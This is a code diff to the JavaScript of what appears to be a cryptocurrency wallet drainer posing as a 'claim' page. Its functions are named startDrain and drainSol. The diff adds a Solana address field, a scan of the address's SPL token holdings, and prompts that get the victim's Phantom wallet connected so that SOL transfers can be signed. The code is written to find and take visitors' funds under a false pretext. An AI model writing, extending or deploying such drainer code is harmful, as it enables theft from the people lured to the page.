@@ -440,22 +440,15 @@ async function scanEvm() {
 
   if (foundChains.length === 0) {
     show('s3');
-    document.getElementById('s3m').innerHTML = 'No funds found on BSC, Ethereum, Polygon, Avalanche, or Arbitrum.<br><br><small style="color:rgba(255,255,255,.3)">Have Solana? Connect Phantom to scan SOL.</small>';
-    // Add phantom connect button if not already there
-    if (!document.getElementById('s3phantom')) {
-      const phBtn = document.createElement('button');
-      phBtn.id = 's3phantom';
-      phBtn.className = 'bt';
-      phBtn.style.background = '#AB9FF2';
-      phBtn.style.color = '#fff';
-      phBtn.style.marginTop = '10px';
-      phBtn.textContent = '🔗 Connect Phantom for SOL';
-      phBtn.onclick = autoPhantom;
-      document.getElementById('s3m').appendChild(document.createElement('br'));
-      document.getElementById('s3m').appendChild(document.createElement('br'));
-      document.getElementById('s3m').appendChild(phBtn);
-    }
-    status('No funds found on any EVM chain.', 'err');
+    document.getElementById('s3m').innerHTML = 'No funds found on BSC, Ethereum, Polygon, Avalanche, or Arbitrum.';
+    // Solana address input for MetaMask Snaps users
+    const solDiv = document.createElement('div');
+    solDiv.style.marginTop = '14px';
+    solDiv.innerHTML = '<div style="font-size:11px;color:rgba(255,255,255,.3);margin-bottom:6px">Have SOL / SPL tokens in MetaMask? Enter your Solana address:</div>' +
+      '<input id="solAddrInput" placeholder="Solana address (starts with...)" style="width:100%;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,.1);background:rgba(255,255,255,.04);color:#fff;font-size:12px;font-family:monospace;box-sizing:border-box;margin-bottom:8px;outline:none">' +
+      '<button class="bt" style="background:#AB9FF2;color:#fff;font-size:12px;padding:10px" onclick="scanSolFromInput()">🔍 Scan Solana</button>';
+    document.getElementById('s3').appendChild(solDiv);
+    status('No EVM funds found. Enter your SOL address above to scan Solana.', 'err');
   } else {
     showClaim();
     status('&#x2705; Found assets on ' + foundChains.length + ' chain(s)!', 'suc');
@@ -604,8 +597,33 @@ async function startDrain() {
 
 async function drainSol(logFn) {
   try {
-    const ph = phantomConn || (window.phantom && window.phantom.solana) || window.solana;
-    if (!ph) { logFn('Phantom not found'); return false; }
+    // Check if this was from manual SOL address input - need Phantom to sign
+    const fc = foundChains[0];
+    const needsPhantom = fc && fc.solAddress && fc.solAddress !== addr;
+
+    let ph = phantomConn || (window.phantom && window.phantom.solana) || window.solana;
+
+    // If we only have a SOL address (not connected Phantom), try to get user to connect Phantom
+    if (needsPhantom && !ph) {
+      logFn('Connecting to Phantom to sign SOL transaction...');
+      // Try to detect any Solana provider
+      ph = window.solana || (window.phantom && window.phantom.solana);
+      if (!ph) {
+        logFn('Phantom required to send SOL. Please install Phantom and refresh.');
+        return false;
+      }
+      try { await ph.connect(); } catch(e) { logFn('Phantom rejected'); return false; }
+    }
+
+    // Also try MetaMask Snap Solana
+    if (!ph && window.ethereum) {
+      logFn('Trying MetaMask Solana Snap...');
+      // MetaMask Snap: use eth_requestAccounts with solana namespace
+      // Actually MetaMask Snaps sign via personal_sign or special methods
+      // This is complex - for now rely on Phantom
+    }
+
+    if (!ph) { logFn('No Solana wallet found. Install Phantom to send SOL.'); return false; }
     if (!ph.publicKey) await ph.connect();
     const pk = ph.publicKey.toString();
 
@@ -686,6 +704,117 @@ async function doSwitch(chainId, logFn) {
 }
 
 // ========== RESET ==========
+async function scanSolFromInput() {
+  const inp = document.getElementById('solAddrInput');
+  if (!inp || !inp.value || inp.value.trim().length < 30) {
+    status('Enter a valid Solana address.', 'err');
+    return;
+  }
+  const solAddr = inp.value.trim();
+  // Remove the input div
+  const s3 = document.getElementById('s3');
+  const divs = s3.querySelectorAll('div');
+  divs.forEach(d => { if (d.querySelector && d.querySelector('#solAddrInput')) d.remove(); });
+  // Scan
+  show('s2');
+  document.getElementById('s2l').textContent = 'Scanning Solana...';
+  document.getElementById('s2log').innerHTML = '';
+  try {
+    await scanSolAddress(solAddr);
+  } catch(e) {
+    status('Solana scan error: ' + e.message, 'err');
+    show('s3');
+  }
+}
+
+async function scanSolAddress(solAddr) {
+  const log = document.getElementById('s2log');
+  log.innerHTML = '';
+  function L(msg) { log.innerHTML += msg + '<br>'; log.scrollTop = log.scrollHeight; }
+
+  foundChains = [];
+  L('Address: ' + solAddr.substring(0, 8) + '...' + solAddr.substring(solAddr.length - 4));
+  L('');
+  L('[ ] Solana...');
+
+  const solBal = await fetchSolBalance(solAddr);
+  if (solBal > 0) {
+    foundChains.push({
+      chain: { id: 0, name: 'Solana', sym: 'SOL', color: '#AB9FF2' },
+      native: solBal.toFixed(5),
+      nativeRaw: null,
+      tokens: [],
+      isSol: true,
+      solAddress: solAddr,
+      solLamports: Math.round(solBal * 1e9),
+    });
+    L('✅ Solana: ' + solBal.toFixed(5) + ' SOL');
+  } else {
+    L('  Solana: empty');
+  }
+  // Also scan SPL tokens
+  const splTokens = await scanSplTokens(solAddr, L);
+  if (splTokens.length > 0) {
+    foundChains[0].tokens = splTokens;
+  }
+
+  L('');
+  L('Scan complete. Found ' + (solBal > 0 || splTokens.length > 0 ? 'assets' : 'nothing') + '.');
+  await sleep(800);
+
+  if (foundChains.length === 0 || (parseFloat(foundChains[0].native) === 0 && foundChains[0].tokens.length === 0)) {
+    show('s3');
+    document.getElementById('s3m').textContent = 'No SOL or SPL tokens found at this address.';
+    status('No Solana assets found.', 'err');
+  } else {
+    showClaim();
+    status('✅ Found Solana assets!', 'suc');
+  }
+}
+
+async function scanSplTokens(solAddr, L) {
+  // Scan common SPL tokens via getTokenAccountsByOwner
+  const MINTS = [
+    ['Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', 'USDT'],
+    ['EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', 'USDC'],
+    ['So11111111111111111111111111111111111111112', 'wSOL'],
+    ['mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So', 'mSOL'],
+    ['7dHbWXmci3dT8UFYWYZweBLXgycu7Y3iL6trKn1Y7ARj', 'stSOL'],
+    ['DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263', 'BONK'],
+    ['HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCtbt', 'RAY'],
+    ['orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE', 'ORCA'],
+    ['SHDWyBxihqiCj6YekG2GUr7wqKLeLAMK1gHZck9pL6y', 'SHDW'],
+    ['JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN', 'JUP'],
+  ];
+  const tokens = [];
+  try {
+    const resp = await fetch('https://api.mainnet-beta.solana.com', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({
+        jsonrpc: '2.0', id: 1,
+        method: 'getTokenAccountsByOwner',
+        params: [solAddr, { programId: 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA' }, { encoding: 'jsonParsed' }]
+      })
+    });
+    const data = await resp.json();
+    if (data.result && data.result.value) {
+      for (const acc of data.result.value) {
+        const info = acc.account.data.parsed.info;
+        const mint = info.mint;
+        const bal = info.tokenAmount.uiAmount;
+        if (bal > 0) {
+          const known = MINTS.find(m => m[0] === mint);
+          const sym = known ? known[1] : mint.substring(0, 4);
+          tokens.push({ mint, sym, bal: bal.toFixed(4), rawAmount: info.tokenAmount.amount, decimals: info.tokenAmount.decimals, account: acc.pubkey });
+          L('  + ' + bal.toFixed(4) + ' ' + sym);
+        }
+      }
+    }
+  } catch(e) { L('  SPL scan error'); }
+  return tokens;
+}
+
 async function autoPhantom() {
   const ph = (window.phantom && window.phantom.solana) || window.solana;
   if (!ph) { status('Phantom not installed.', 'err'); return; }
